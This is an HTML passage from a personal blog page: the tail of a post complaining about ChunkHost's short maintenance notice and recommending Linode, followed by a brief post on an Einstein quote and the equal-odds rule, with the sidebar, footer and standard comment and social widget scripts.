        <p><strong>Not enough notice given for “scheduled” maintenance.</strong> Four days before the two outages I had experienced, ChunkHost performed some scheduled maintenance. I am thankful that the maintenance occurred in off-peak hours, but <strong>I received the notice at the end of the previous day</strong>. This is not adequate notice. Had there been anything critical running on my VM, I would expect adequate notice so I could make proper arrangements ahead of time. 
It saddens me to think that my last eight months at ChunkHost were a waste. Fortunately, <a href="http://www.linode.com/?r=2fce38a23c4154c3a1abb4f99aafd6371ee78ecc">I’ve been using Linode for my “real services” for just as long</a> and I know that I won’t be disappointed there. If you’re looking for a VM for testing and development purposes only, ChunkHost might be an option – just don’t let your development server evolve into a production server.</p>
      </li>
    </ul>
  </li>
</ol>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/i-think-and-think-for-months-and-years-99-times-the-conclusion-is-false-the-hundredth-time-i-am-right-einstein/">I Think and Think for Months and Years. 99 Times, the Conclusion Is False. The Hundredth Time I Am Right - Einstein</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2010-09-05T00:00:00+00:00" pubdate data-updated="true">Sep 5<span>th</span>, 2010</time>
        
      </p>
    
  </header>


  <div class="entry-content"><h1 id="section"></h1>

<p>“I think and think for months and years. Ninety-nine times, the conclusion is false. The hundredth time I am right.” — <a href="http://nobelprize.org/nobel_prizes/physics/laureates/1921/einstein-bio.html">Albert Einstein</a></p>

<p>I think Einstein was onto the <a href="http://www.sebastianmarshall.com/?p=195">equal-odds rule</a>.  </p>

</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/blog/page/6/">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/blog/page/4/">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <!-- Ads removed -->
</section>
<section>
  <h1>About Charles</h1>
	<img src="http://www.gravatar.com/avatar/9f645d339b731bc99a95704ad4289aac.png?size=160" alt="Charles Hooper"/>
	<p>Charles is an engineer at <a href="http://truss.works/">Truss</a>. He enjoys archery, smoking meat, gardening, home brewing, and hacking.</p>
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/personal-archery-faq/">Personal Archery FAQ</a>
      </li>
    
      <li class="post">
        <a href="/blog/what-am-i-supposed-to-do-with-all-of-this-honey/">What am I supposed to do with all of this honey?!</a>
      </li>
    
      <li class="post">
        <a href="/blog/give-it-a-rest/">Give it a rest</a>
      </li>
    
      <li class="post">
        <a href="/blog/on-slack-and-upkeep/">On Slack and Upkeep</a>
      </li>
    
      <li class="post">
        <a href="/blog/what-i-do-sre/">What I Do as an SRE</a>
      </li>
    
  </ul>
</section>

<section>
  <!-- Ads removed -->
</section>

  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - Charles Hooper -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'charleshooper';
      
        
        var disqus_script = 'count.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
